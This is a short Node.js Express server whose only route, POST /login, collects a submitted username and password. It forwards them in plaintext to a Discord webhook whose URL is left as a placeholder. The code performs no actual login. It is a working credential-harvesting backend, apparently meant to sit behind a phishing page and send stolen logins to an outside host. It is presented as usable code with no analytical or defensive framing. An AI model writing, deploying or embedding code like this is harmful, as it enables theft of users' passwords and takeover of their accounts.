const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
const PORT = 3000;
const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL';

app.use(bodyParser.json());

app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    // Send data to Discord webhook
    const payload = { username, password };
    try {
        const response = await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            res.send('Data sent to Discord successfully');
        } else {
            res.status(500).send('Failed to send data to Discord');
        }
    } catch (error) {
        res.status(500).send('Error: ' + error.message);
    }
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
